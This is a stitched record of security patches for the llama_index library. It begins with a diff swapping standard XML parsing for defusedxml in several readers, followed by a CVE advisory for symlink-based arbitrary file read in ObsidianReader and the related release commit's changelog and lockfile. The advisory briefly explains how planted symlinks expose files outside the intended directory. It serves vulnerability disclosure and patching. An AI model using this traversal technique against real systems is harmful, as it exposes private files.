     ) -> List[Document]:
-        """Search for a topic on Pubmed, fetch the text of the most relevant full-length papers.
+        """
+        Search for a topic on Pubmed, fetch the text of the most relevant full-length papers.
         Uses the BoiC API, which has been down a lot.
 
         Args:
@@ -27,10 +30,10 @@ def load_data_bioc(
         Returns:
             List[Document]: A list of Document objects.
         """
-        import xml.etree.ElementTree as xml
         from datetime import datetime
 
         import requests
+        from defusedxml import ElementTree as safe_xml
 
         pubmed_search = []
         parameters = {"tool": "tool", "email": "email", "db": "pmc"}
@@ -40,7 +43,7 @@ def load_data_bioc(
             "https://eutils.ncbi.nlm.nih.gov/entrez/eutils/esearch.fcgi",
             params=parameters,
         )
-        root = xml.fromstring(resp.content)
+        root = safe_xml.fromstring(resp.content)
 
         for elem in root.iter():
             if elem.tag == "Id":
@@ -99,7 +102,8 @@ def load_data(
         search_query: str,
         max_results: Optional[int] = 10,
     ) -> List[Document]:
-        """Search for a topic on Pubmed, fetch the text of the most relevant full-length papers.
+        """
+        Search for a topic on Pubmed, fetch the text of the most relevant full-length papers.
 
         Args:
             search_query (str): A topic to search for (e.g. "Alzheimers").
@@ -110,7 +114,6 @@ def load_data(
             List[Document]: A list of Document objects.
         """
         import time
-        import xml.etree.ElementTree as xml
 
         import requests
 
@@ -122,7 +125,7 @@ def load_data(
             "https://eutils.ncbi.nlm.nih.gov/entrez/eutils/esearch.fcgi",
             params=parameters,
         )
-        root = xml.fromstring(resp.content)
+        root = safe_xml.fromstring(resp.content)
 
         for elem in root.iter():
             if elem.tag == "Id":
@@ -131,7 +134,7 @@ def load_data(
                 print(url)
                 try:
                     resp = requests.get(url)
-                    info = xml.fromstring(resp.content)
+                    info = safe_xml.fromstring(resp.content)
 
                     raw_text = ""
                     title = ""
diff --git a/llama-index-integrations/readers/llama-index-readers-papers/pyproject.toml b/llama-index-integrations/readers/llama-index-readers-papers/pyproject.toml
index 4c37588227..395c6b4f0a 100644
--- a/llama-index-integrations/readers/llama-index-readers-papers/pyproject.toml
+++ b/llama-index-integrations/readers/llama-index-readers-papers/pyproject.toml
@@ -29,12 +29,13 @@ license = "MIT"
 maintainers = ["thejessezhang"]
 name = "llama-index-readers-papers"
 readme = "README.md"
-version = "0.3.1"
+version = "0.3.2"
 
 [tool.poetry.dependencies]
 python = ">=3.9,<4.0"
 arxiv = "^2.1.0"
 llama-index-core = "^0.12.0"
+defusedxml = "^0.7.1"
 
 [tool.poetry.group.dev.dependencies]
 ipython = "8.10.0"
diff --git a/llama-index-integrations/readers/llama-index-readers-stripe-docs/llama_index/readers/stripe_docs/base.py b/llama-index-integrations/readers/llama-index-readers-stripe-docs/llama_index/readers/stripe_docs/base.py
index 1feb6a5e89..784da686de 100644
--- a/llama-index-integrations/readers/llama-index-readers-stripe-docs/llama_index/readers/stripe_docs/base.py
+++ b/llama-index-integrations/readers/llama-index-readers-stripe-docs/llama_index/readers/stripe_docs/base.py
@@ -1,7 +1,7 @@
 import urllib.request
-import xml.etree.ElementTree as ET
 from typing import List
 
+from defusedxml.ElementTree import fromstring
 from llama_index.core.readers.base import BaseReader
 from llama_index.core.schema import Document
 from llama_index.readers.web import AsyncWebPageReader
@@ -13,7 +13,8 @@
 
 
 class StripeDocsReader(BaseReader):
-    """Asynchronous Stripe documentation reader.
+    """
+    Asynchronous Stripe documentation reader.
 
     Reads pages from the Stripe documentation based on the sitemap.xml.
 
@@ -36,7 +37,7 @@ def _load_sitemap(self) -> str:
     def _parse_sitemap(
         self, raw_sitemap: str, filters: List[str] = DEFAULT_FILTERS
     ) -> List:
-        root_sitemap = ET.fromstring(raw_sitemap)
+        root_sitemap = fromstring(raw_sitemap)
         sitemap_partition_urls = []
         sitemap_urls = []
 
@@ -45,7 +46,7 @@ def _parse_sitemap(
             sitemap_partition_urls.append(loc)
 
         for sitemap_partition_url in sitemap_partition_urls:
-            sitemap_partition = ET.fromstring(self._load_url(sitemap_partition_url))
+            sitemap_partition = fromstring(self._load_url(sitemap_partition_url))
 
             # Find all <url /> and iterate through them
             for url in sitemap_partition.findall(f"{{{XML_SITEMAP_SCHEMA}}}url"):
diff --git a/llama-index-integrations/readers/llama-index-readers-stripe-docs/pyproject.toml b/llama-index-integrations/readers/llama-index-readers-stripe-docs/pyproject.toml
index cdd7e9ab8f..53aadb5d57 100644
--- a/llama-index-integrations/readers/llama-index-readers-stripe-docs/pyproject.toml
+++ b/llama-index-integrations/readers/llama-index-readers-stripe-docs/pyproject.toml
@@ -29,7 +29,7 @@ license = "GPL-3.0-or-later"
 maintainers = ["amorriscode"]
 name = "llama-index-readers-stripe-docs"
 readme = "README.md"
-version = "0.3.0"
+version = "0.3.1"
 
 [tool.poetry.dependencies]
 python = ">=3.9,<4.0"
@@ -37,6 +37,7 @@ html2text = "^2024.2.26"
 urllib3 = "^2.1.0"
 llama-index-readers-web = "^0.3.0"
 llama-index-core = "^0.12.0"
+defusedxml = "^0.7.1"
 
 [tool.poetry.group.dev.dependencies]
 ipython = "8.10.0"
diff --git a/llama-index-integrations/readers/llama-index-readers-web/llama_index/readers/web/sitemap/base.py b/llama-index-integrations/readers/llama-index-readers-web/llama_index/readers/web/sitemap/base.py
index 25d02fec49..6022101184 100644
--- a/llama-index-integrations/readers/llama-index-readers-web/llama_index/readers/web/sitemap/base.py
+++ b/llama-index-integrations/readers/llama-index-readers-web/llama_index/readers/web/sitemap/base.py
@@ -1,14 +1,15 @@
 import urllib.request
-import xml.etree.ElementTree as ET
 from typing import List
 
+from defusedxml.ElementTree import fromstring
 from llama_index.core.readers.base import BaseReader
 from llama_index.core.schema import Document
 from llama_index.readers.web.async_web.base import AsyncWebPageReader
 
 
 class SitemapReader(BaseReader):
-    """Asynchronous sitemap reader for web.
+    """
+    Asynchronous sitemap reader for web.
 
     Reads pages from the web based on their sitemap.xml.
 
@@ -34,7 +35,7 @@ def _load_sitemap(self, sitemap_url: str) -> str:
         return sitemap_url_request.read()
 
     def _parse_sitemap(self, raw_sitemap: str, filter_locs: str = None) -> list:
-        sitemap = ET.fromstring(raw_sitemap)
+        sitemap = fromstring(raw_sitemap)
         sitemap_urls = []
 
         for url in sitemap.findall(f"{{{self.xml_schema_sitemap}}}url"):
diff --git a/llama-index-integrations/readers/llama-index-readers-web/pyproject.toml b/llama-index-integrations/readers/llama-index-readers-web/pyproject.toml
index 17e443153d..4a0e634128 100644
--- a/llama-index-integrations/readers/llama-index-readers-web/pyproject.toml
+++ b/llama-index-integrations/readers/llama-index-readers-web/pyproject.toml
@@ -47,7 +47,7 @@ license = "GPL-3.0-or-later"
 maintainers = ["HawkClaws", "Hironsan", "NA", "an-bluecat", "bborn", "jasonwcfan", "kravetsmic", "pandazki", "ruze00", "selamanse", "thejessezhang"]
 name = "llama-index-readers-web"
 readme = "README.md"
-version = "0.3.8"
+version = "0.3.9"
 
 [tool.poetry.dependencies]
 python = ">=3.9,<4.0"
@@ -62,6 +62,7 @@ playwright = ">=1.30,<2.0"
 newspaper3k = "^0.2.8"
 spider-client = "^0.0.27"
 llama-index-core = "^0.12.0"
+defusedxml = "^0.7.1"
 
 [tool.poetry.group.dev.dependencies]
 ipython = "8.10.0"


================================================================================


CVE ID: CVE-2025-3046
Published: 2025-07-07T10:15:26.900
Modified: 2025-07-30T21:25:03.810
CVSS Score: 7.5 (HIGH) [v3.0]
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A vulnerability in the `ObsidianReader` class of the run-llama/llama_index repository, versions 0.12.23 to 0.12.28, allows for arbitrary file read through symbolic links. The `ObsidianReader` fails to resolve symlinks to their real paths and does not validate whether the resolved paths lie within the intended directory. This flaw enables attackers to place symlinks pointing to files outside the vault directory, which are then processed as valid Markdown files, potentially exposing sensitive information.

References (3):
  1. https://github.com/run-llama/llama_index/commit/0008041e8dde8e519621388e5d6f558bde6ef42e [Patch]
  2. https://huntr.com/bounties/90a1f1b2-bb82-4d66-9fc1-856ed5f904da [Exploit, Third Party Advisory]
  3. https://huntr.com/bounties/90a1f1b2-bb82-4d66-9fc1-856ed5f904da [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/run-llama/llama_index/commit/0008041e8dde8e519621388e5d6f558bde6ef42e ---
From 0008041e8dde8e519621388e5d6f558bde6ef42e Mon Sep 17 00:00:00 2001
From: Logan <logan.markewich@live.com>
Date: Tue, 1 Apr 2025 19:46:45 -0600
Subject: [PATCH] v0.12.28 (#18340)

---
 CHANGELOG.md                                  |  88 +++
 docs/docs/CHANGELOG.md                        |  88 +++
 docs/docs/api_reference/agent/index.md        |   5 +-
 docs/docs/api_reference/llms/asi.md           |   4 +
 docs/docs/api_reference/readers/myscale.md    |   4 -
 docs/mkdocs.yml                               |   9 +-
 llama-index-core/llama_index/core/__init__.py |   2 +-
 .../core/agent/workflow/react_agent.py        |   7 +-
 llama-index-core/pyproject.toml               |   2 +-
 poetry.lock                                   | 572 +++++++++---------
 pyproject.toml                                |   4 +-
 11 files changed, 483 insertions(+), 302 deletions(-)
 create mode 100644 docs/docs/api_reference/llms/asi.md
 delete mode 100644 docs/docs/api_reference/readers/myscale.md

diff --git a/CHANGELOG.md b/CHANGELOG.md
index e748136a9e..99f8848db2 100644
--- a/CHANGELOG.md
+++ b/CHANGELOG.md
@@ -1,5 +1,93 @@
 # ChangeLog
 
+## [2025-04-01]
+
+### `llama-index-core` [0.12.28]
+
+- add a code act agent + docs + from-scratch guide (#18329)
+- fix template var mapping for `RichPromptTemplate`, add docs (#18309)
+- Support multi-modal agents in `AgentWorkflow` / `ReActAgent` / `FunctionAgent` / `CodeActAgent` (#18330)
+- fix include Node metadata in hash calculation in new node class (#18303)
+- Fix `Context._events_queue` when loaded from `Context.from_dict` (#18304)
+- docs: add Langfuse instrumentation (#18321)
+
+### `llama-index-embeddings-fastembed` [0.3.1]
+
+- add providers kwarg (#18310)
+
+### `llama-index-graph-stores-memgraph` [0.3.1]
+
+- Update Memgraph integration to latest syntax (#18319)
+
+### `llama-index-indices-managed-llama-cloud` [0.6.10]
+
+- misc fixes in constructing client (#18323)
+
+### `llama-index-llms-asi` [0.1.0]
+
+- add asi llm integration (#18292)
+
+### `llama-index-llms-dashscope` [0.3.2]
+
+- Update DashScope integration with new tool handling and dependency version bump (#18311)
+
+### `llama-index-llms-ipex-llm` [0.3.1]
+
+- fix IpexLLM constructor error (#18200)
+
+### `llama-index-llms-litellm` [0.4.1]
+
+- LiteLLM: better support tools streaming, and support multimodal inputs (#18314)
+
+### `llama-index-readers-obsidian` [0.5.1]
+
+- fix: prevent path traversal from symlinks (#18320)
+
+### `llama-index-readers-papers` [0.3.1]
+
+- fix: make filename hashing more robust (#18318)
+
+### `llama-index-tools-mcp` [0.1.1]
+
+- Fixed case when `json_type` is a list (multiple possible types) (#18306)
+
+### `llama-index-vector-stores-clickhouse` [0.4.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-couchbase` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-deeplake` [0.3.3]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-jaguar` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-lantern` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-nile` [0.2.2]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-milvus` [0.7.2]
+
+- [bugfix] Milvus create index when existed (#18315)
+- Add more unit tests for milvus vector store (#18331)
+
+### `llama-index-vector-stores-oracledb` [0.2.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-singlestoredb` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
 ## [2025-03-28]
 
 ### `llama-index-core` [0.12.27]
diff --git a/docs/docs/CHANGELOG.md b/docs/docs/CHANGELOG.md
index e748136a9e..99f8848db2 100644
--- a/docs/docs/CHANGELOG.md
+++ b/docs/docs/CHANGELOG.md
@@ -1,5 +1,93 @@
 # ChangeLog
 
+## [2025-04-01]
+
+### `llama-index-core` [0.12.28]
+
+- add a code act agent + docs + from-scratch guide (#18329)
+- fix template var mapping for `RichPromptTemplate`, add docs (#18309)
+- Support multi-modal agents in `AgentWorkflow` / `ReActAgent` / `FunctionAgent` / `CodeActAgent` (#18330)
+- fix include Node metadata in hash calculation in new node class (#18303)
+- Fix `Context._events_queue` when loaded from `Context.from_dict` (#18304)
+- docs: add Langfuse instrumentation (#18321)
+
+### `llama-index-embeddings-fastembed` [0.3.1]
+
+- add providers kwarg (#18310)
+
+### `llama-index-graph-stores-memgraph` [0.3.1]
+
+- Update Memgraph integration to latest syntax (#18319)
+
+### `llama-index-indices-managed-llama-cloud` [0.6.10]
+
+- misc fixes in constructing client (#18323)
+
+### `llama-index-llms-asi` [0.1.0]
+
+- add asi llm integration (#18292)
+
+### `llama-index-llms-dashscope` [0.3.2]
+
+- Update DashScope integration with new tool handling and dependency version bump (#18311)
+
+### `llama-index-llms-ipex-llm` [0.3.1]
+
+- fix IpexLLM constructor error (#18200)
+
+### `llama-index-llms-litellm` [0.4.1]
+
+- LiteLLM: better support tools streaming, and support multimodal inputs (#18314)
+
+### `llama-index-readers-obsidian` [0.5.1]
+
+- fix: prevent path traversal from symlinks (#18320)
+
+### `llama-index-readers-papers` [0.3.1]
+
+- fix: make filename hashing more robust (#18318)
+
+### `llama-index-tools-mcp` [0.1.1]
+
+- Fixed case when `json_type` is a list (multiple possible types) (#18306)
+
+### `llama-index-vector-stores-clickhouse` [0.4.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-couchbase` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-deeplake` [0.3.3]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-jaguar` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-lantern` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-nile` [0.2.2]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-milvus` [0.7.2]
+
+- [bugfix] Milvus create index when existed (#18315)
+- Add more unit tests for milvus vector store (#18331)
+
+### `llama-index-vector-stores-oracledb` [0.2.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
+### `llama-index-vector-stores-singlestoredb` [0.3.1]
+
+- fix: patch multiple sql-injection vulnerabilities (#18316)
+
 ## [2025-03-28]
 
 ### `llama-index-core` [0.12.27]
diff --git a/docs/docs/api_reference/agent/index.md b/docs/docs/api_reference/agent/index.md
index 822313eeab..4f522b7ae0 100644
--- a/docs/docs/api_reference/agent/index.md
+++ b/docs/docs/api_reference/agent/index.md
@@ -1,6 +1,4 @@
-# Core Agent Classes
-
-## Base Types
+# Agent Classes
 
 ::: llama_index.core.agent.workflow
     options:
@@ -9,6 +7,7 @@
         - BaseWorkflowAgent
         - FunctionAgent
         - ReActAgent
+        - CodeActAgent
         - AgentInput
         - AgentStream
         - AgentOutput
diff --git a/docs/docs/api_reference/llms/asi.md b/docs/docs/api_reference/llms/asi.md
new file mode 100644
index 0000000000..ed914652e2
--- /dev/null
+++ b/docs/docs/api_reference/llms/asi.md
@@ -0,0 +1,4 @@
+::: llama_index.llms.asi
+    options:
+      members:
+        - ASI
diff --git a/docs/docs/api_reference/readers/myscale.md b/docs/docs/api_reference/readers/myscale.md
deleted file mode 100644
index 8624f784c1..0000000000
--- a/docs/docs/api_reference/readers/myscale.md
+++ /dev/null
@@ -1,4 +0,0 @@
-::: llama_index.readers.myscale
-    options:
-      members:
-        - MyScaleReader
diff --git a/docs/mkdocs.yml b/docs/mkdocs.yml
index 3fee5be5dd..c8e9205d41 100644
--- a/docs/mkdocs.yml
+++ b/docs/mkdocs.yml
@@ -97,6 +97,8 @@ nav:
           - ./examples/agent/agent_workflow_research_assistant.ipynb
           - ./examples/agent/anthropic_agent.ipynb
           - ./examples/agent/bedrock_converse_agent.ipynb
+          - ./examples/agent/code_act_agent.ipynb
+          - ./examples/agent/from_scratch_code_act_agent.ipynb
           - ./examples/agent/memory/chat_memory_buffer.ipynb
           - ./examples/agent/memory/composable_memory.ipynb
           - ./examples/agent/memory/summary_memory_buffer.ipynb
@@ -181,7 +183,6 @@ nav:
           - ./examples/data_connectors/MboxReaderDemo.ipynb
           - ./examples/data_connectors/MilvusReaderDemo.ipynb
           - ./examples/data_connectors/MongoDemo.ipynb
-          - ./examples/data_connectors/MyScaleReaderDemo.ipynb
           - ./examples/data_connectors/NotionDemo.ipynb
           - ./examples/data_connectors/ObsidianReaderDemo.ipynb
           - ./examples/data_connectors/PathwayReaderDemo.ipynb
@@ -522,6 +523,7 @@ nav:
           - ./examples/prompts/advanced_prompts.ipynb
           - ./examples/prompts/emotion_prompt.ipynb
           - ./examples/prompts/prompt_mixin.ipynb
+          - ./examples/prompts/rich_prompt_template_features.ipynb
       - Property Graph:
           - ./examples/property_graph/graph_store.ipynb
           - ./examples/property_graph/property_graph_advanced.ipynb
@@ -987,6 +989,7 @@ nav:
           - ./api_reference/llms/alibabacloud_aisearch.md
           - ./api_reference/llms/anthropic.md
           - ./api_reference/llms/anyscale.md
+          - ./api_reference/llms/asi.md
           - ./api_reference/llms/azure_inference.md
           - ./api_reference/llms/azure_openai.md
           - ./api_reference/llms/bedrock.md
@@ -2399,8 +2402,10 @@ plugins:
             - ../llama-index-integrations/llms/llama-index-llms-novita
             - ../llama-index-integrations/llms/llama-index-llms-netmind
             - ../llama-index-integrations/tools/llama-index-tools-dappier
+            - ../llama-index-integrations/llms/llama-index-llms-asi
   - redirects:
       redirect_maps:
+        ./api/llama_index.vector_stores.MongoDBAtlasVectorSearch.html: api_reference/storage/vector_store/mongodb.md
         ./api_reference/agent/coa/index.html: https://docs.llamaindex.ai/en/stable/api_reference/agent/
         ./api_reference/agent/dashscope/index.html: https://docs.llamaindex.ai/en/stable/api_reference/agent/
         ./api_reference/agent/function/index.html: https://docs.llamaindex.ai/en/stable/api_reference/agent/
@@ -2411,7 +2416,6 @@ plugins:
         ./api_reference/agent/openai_legacy/index.html: https://docs.llamaindex.ai/en/stable/api_reference/agent/
         ./api_reference/agent/react/index.html: https://docs.llamaindex.ai/en/stable/api_reference/agent/
         ./api_reference/agent/workflow/index.html: https://docs.llamaindex.ai/en/stable/api_reference/agent/
-        ./api/llama_index.vector_stores.MongoDBAtlasVectorSearch.html: api_reference/storage/vector_store/mongodb.md
         ./changes/deprecated_terms.html: https://docs.llamaindex.ai/en/stable/changes/deprecated_terms/
         ./community/faq/chat_engines.html: https://docs.llamaindex.ai/en/stable/community/faq/chat_engines/
         ./community/faq/documents_and_nodes.html: https://docs.llamaindex.ai/en/stable/community/faq/documents_and_nodes/
@@ -2560,7 +2564,6 @@ plugins:
         ./examples/data_connectors/MboxReaderDemo.html: https://docs.llamaindex.ai/en/stable/examples/data_connectors/MboxReaderDemo/
         ./examples/data_connectors/MilvusReaderDemo.html: https://docs.llamaindex.ai/en/stable/examples/data_connectors/MilvusReaderDemo/
         ./examples/data_connectors/MongoDemo.html: https://docs.llamaindex.ai/en/stable/examples/data_connectors/MongoDemo/
-        ./examples/data_connectors/MyScaleReaderDemo.html: https://docs.llamaindex.ai/en/stable/examples/data_connectors/MyScaleReaderDemo/
         ./examples/data_connectors/NotionDemo.html: https://docs.llamaindex.ai/en/stable/examples/data_connectors/NotionDemo/
         ./examples/data_connectors/ObsidianReaderDemo.html: https://docs.llamaindex.ai/en/stable/examples/data_connectors/ObsidianReaderDemo/
         ./examples/data_connectors/PathwayReaderDemo.html: https://docs.llamaindex.ai/en/stable/examples/data_connectors/PathwayReaderDemo/
diff --git a/llama-index-core/llama_index/core/__init__.py b/llama-index-core/llama_index/core/__init__.py
index fb25f0d858..caccfd8e87 100644
--- a/llama-index-core/llama_index/core/__init__.py
+++ b/llama-index-core/llama_index/core/__init__.py
@@ -1,6 +1,6 @@
 """Init file of LlamaIndex."""
 
-__version__ = "0.12.27"
+__version__ = "0.12.28"
 
 import logging
 from logging import NullHandler
diff --git a/llama-index-core/llama_index/core/agent/workflow/react_agent.py b/llama-index-core/llama_index/core/agent/workflow/react_agent.py
index 4e3ab9713c..4e35351f16 100644
--- a/llama-index-core/llama_index/core/agent/workflow/react_agent.py
+++ b/llama-index-core/llama_index/core/agent/workflow/react_agent.py
@@ -1,5 +1,5 @@
 import uuid
-from typing import List, Sequence, cast
+from typing import List, Sequence, Optional, cast
 
 from llama_index.core.agent.react.formatter import ReActChatFormatter
 from llama_index.core.agent.react.output_parser import ReActOutputParser
@@ -28,9 +28,10 @@
 from llama_index.core.workflow import Context
 
 
-def default_formatter(fields: dict) -> ReActChatFormatter:
+def default_formatter(fields: Optional[dict] = None) -> ReActChatFormatter:
     """Sets up a default formatter so that the proper react header is set."""
-    return ReActChatFormatter.from_defaults(context=fields["system_prompt"])
+    fields = fields or {}
+    return ReActChatFormatter.from_defaults(context=fields.get("system_prompt", None))
 
 
 class ReActAgent(SingleAgentRunnerMixin, BaseWorkflowAgent):
diff --git a/llama-index-core/pyproject.toml b/llama-index-core/pyproject.toml
index a437a3291a..e276c438b6 100644
--- a/llama-index-core/pyproject.toml
+++ b/llama-index-core/pyproject.toml
@@ -46,7 +46,7 @@ name = "llama-index-core"
 packages = [{include = "llama_index"}]
 readme = "README.md"
 repository = "https://github.com/run-llama/llama_index"
-version = "0.12.27"
+version = "0.12.28"
 
 [tool.poetry.dependencies]
 SQLAlchemy = {extras = ["asyncio"], version = ">=1.4.49"}
diff --git a/poetry.lock b/poetry.lock
index d0c7bf5008..c5ce268eaa 100644
--- a/poetry.lock
+++ b/poetry.lock
@@ -13,92 +13,92 @@ files = [
 
 [[package]]
 name = "aiohttp"
-version = "3.11.14"
+version = "3.11.15"
 description = "Async http client/server framework (asyncio)"
 optional = false
 python-versions = ">=3.9"
 files = [
-    {file = "aiohttp-3.11.14-cp310-cp310-macosx_10_9_universal2.whl", hash = "sha256:e2bc827c01f75803de77b134afdbf74fa74b62970eafdf190f3244931d7a5c0d"},
-    {file = "aiohttp-3.11.14-cp310-cp310-macosx_10_9_x86_64.whl", hash = "sha256:e365034c5cf6cf74f57420b57682ea79e19eb29033399dd3f40de4d0171998fa"},
-    {file = "aiohttp-3.11.14-cp310-cp310-macosx_11_0_arm64.whl", hash = "sha256:c32593ead1a8c6aabd58f9d7ee706e48beac796bb0cb71d6b60f2c1056f0a65f"},
-    {file = "aiohttp-3.11.14-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:b4e7c7ec4146a94a307ca4f112802a8e26d969018fabed526efc340d21d3e7d0"},
-    {file = "aiohttp-3.11.14-cp310-cp310-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:c8b2df9feac55043759aa89f722a967d977d80f8b5865a4153fc41c93b957efc"},
-    {file = "aiohttp-3.11.14-cp310-cp310-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:c7571f99525c76a6280f5fe8e194eeb8cb4da55586c3c61c59c33a33f10cfce7"},
-    {file = "aiohttp-3.11.14-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:b59d096b5537ec7c85954cb97d821aae35cfccce3357a2cafe85660cc6295628"},
-    {file = "aiohttp-3.11.14-cp310-cp310-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:b42dbd097abb44b3f1156b4bf978ec5853840802d6eee2784857be11ee82c6a0"},
-    {file = "aiohttp-3.11.14-cp310-cp310-musllinux_1_2_aarch64.whl", hash = "sha256:b05774864c87210c531b48dfeb2f7659407c2dda8643104fb4ae5e2c311d12d9"},
-    {file = "aiohttp-3.11.14-cp310-cp310-musllinux_1_2_armv7l.whl", hash = "sha256:4e2e8ef37d4bc110917d038807ee3af82700a93ab2ba5687afae5271b8bc50ff"},
-    {file = "aiohttp-3.11.14-cp310-cp310-musllinux_1_2_i686.whl", hash = "sha256:e9faafa74dbb906b2b6f3eb9942352e9e9db8d583ffed4be618a89bd71a4e914"},
-    {file = "aiohttp-3.11.14-cp310-cp310-musllinux_1_2_ppc64le.whl", hash = "sha256:7e7abe865504f41b10777ac162c727af14e9f4db9262e3ed8254179053f63e6d"},
-    {file = "aiohttp-3.11.14-cp310-cp310-musllinux_1_2_s390x.whl", hash = "sha256:4848ae31ad44330b30f16c71e4f586cd5402a846b11264c412de99fa768f00f3"},
-    {file = "aiohttp-3.11.14-cp310-cp310-musllinux_1_2_x86_64.whl", hash = "sha256:2d0b46abee5b5737cb479cc9139b29f010a37b1875ee56d142aefc10686a390b"},
-    {file = "aiohttp-3.11.14-cp310-cp310-win32.whl", hash = "sha256:a0d2c04a623ab83963576548ce098baf711a18e2c32c542b62322a0b4584b990"},
-    {file = "aiohttp-3.11.14-cp310-cp310-win_amd64.whl", hash = "sha256:5409a59d5057f2386bb8b8f8bbcfb6e15505cedd8b2445db510563b5d7ea1186"},
-    {file = "aiohttp-3.11.14-cp311-cp311-macosx_10_9_universal2.whl", hash = "sha256:f296d637a50bb15fb6a229fbb0eb053080e703b53dbfe55b1e4bb1c5ed25d325"},
-    {file = "aiohttp-3.11.14-cp311-cp311-macosx_10_9_x86_64.whl", hash = "sha256:ec6cd1954ca2bbf0970f531a628da1b1338f594bf5da7e361e19ba163ecc4f3b"},
-    {file = "aiohttp-3.11.14-cp311-cp311-macosx_11_0_arm64.whl", hash = "sha256:572def4aad0a4775af66d5a2b5923c7de0820ecaeeb7987dcbccda2a735a993f"},
-    {file = "aiohttp-3.11.14-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:1c68e41c4d576cd6aa6c6d2eddfb32b2acfb07ebfbb4f9da991da26633a3db1a"},
-    {file = "aiohttp-3.11.14-cp311-cp311-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:99b8bbfc8111826aa8363442c0fc1f5751456b008737ff053570f06a151650b3"},
-    {file = "aiohttp-3.11.14-cp311-cp311-manylinux_2_17_s390x.manylinux2014_s390x.whl", hash = "sha256:4b0a200e85da5c966277a402736a96457b882360aa15416bf104ca81e6f5807b"},
-    {file = "aiohttp-3.11.14-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl", hash = "sha256:d173c0ac508a2175f7c9a115a50db5fd3e35190d96fdd1a17f9cb10a6ab09aa1"},
-    {file = "aiohttp-3.11.14-cp311-cp311-manylinux_2_5_i686.manylinux1_i686.manylinux_2_17_i686.manylinux2014_i686.whl", hash = "sha256:413fe39fd929329f697f41ad67936f379cba06fcd4c462b62e5b0f8061ee4a77"},
-    {file = "aiohttp-3.11.14-cp311-cp311-musllinux_1_2_aarch64.whl", hash = "sha256:65c75b14ee74e8eeff2886321e76188cbe938d18c85cff349d948430179ad02c"},
-    {file = "aiohttp-3.11.14-cp311-cp311-musllinux_1_2_armv7l.whl", hash = "sha256:321238a42ed463848f06e291c4bbfb3d15ba5a79221a82c502da3e23d7525d06"},
-    {file = "aiohttp-3.11.14-cp311-cp311-musllinux_1_2_i686.whl", hash = "sha256:59a05cdc636431f7ce843c7c2f04772437dd816a5289f16440b19441be6511f1"},
-    {file = "aiohttp-3.11.14-cp311-cp311-musllinux_1_2_ppc64le.whl", hash = "sha256:daf20d9c3b12ae0fdf15ed92235e190f8284945563c4b8ad95b2d7a31f331cd3"},
-    {file = "aiohttp-3.11.14-cp311-cp311-musllinux_1_2_s390x.whl", hash = "sha256:05582cb2d156ac7506e68b5eac83179faedad74522ed88f88e5861b78740dc0e"},
-    {file = "aiohttp-3.11.14-cp311-cp311-musllinux_1_2_x86_64.whl", hash = "sha256:12c5869e7ddf6b4b1f2109702b3cd7515667b437da90a5a4a50ba1354fe41881"},
-    {file = "aiohttp-3.11.14-cp311-cp311-win32.whl", hash = "sha256:92868f6512714efd4a6d6cb2bfc4903b997b36b97baea85f744229f18d12755e"},
-    {file = "aiohttp-3.11.14-cp311-cp311-win_amd64.whl", hash = "sha256:bccd2cb7aa5a3bfada72681bdb91637094d81639e116eac368f8b3874620a654"},
-    {file = "aiohttp-3.11.14-cp312-cp312-macosx_10_13_universal2.whl", hash = "sha256:70ab0f61c1a73d3e0342cedd9a7321425c27a7067bebeeacd509f96695b875fc"},
-    {file = "aiohttp-3.11.14-cp312-cp312-macosx_10_13_x86_64.whl", hash = "sha256:602d4db80daf4497de93cb1ce00b8fc79969c0a7cf5b67bec96fa939268d806a"},
-    {file = "aiohttp-3.11.14-cp312-cp312-macosx_11_0_arm64.whl", hash = "sha256:3a8a0d127c10b8d89e69bbd3430da0f73946d839e65fec00ae48ca7916a31948"},
-    {file = "aiohttp-3.11.14-cp312-cp312-manylinux_2_17_aarch64.manylinux2014_aarch64.whl", hash = "sha256:ca9f835cdfedcb3f5947304e85b8ca3ace31eef6346d8027a97f4de5fb687534"},
-    {file = "aiohttp-3.11.14-cp312-cp312-manylinux_2_17_ppc64le.manylinux2014_ppc64le.whl", hash = "sha256:8aa5c68e1e68fff7cd3142288101deb4316b51f03d50c92de6ea5ce646e6c71f"},
